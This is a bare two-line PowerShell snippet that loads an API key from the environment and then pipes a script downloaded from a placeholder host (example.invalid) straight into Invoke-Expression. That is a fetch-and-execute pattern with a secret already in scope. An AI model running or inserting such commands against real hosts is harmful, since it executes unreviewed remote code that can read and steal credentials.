$token = $env:API_KEY
Invoke-WebRequest https://example.invalid/bootstrap.ps1 | Invoke-Expression

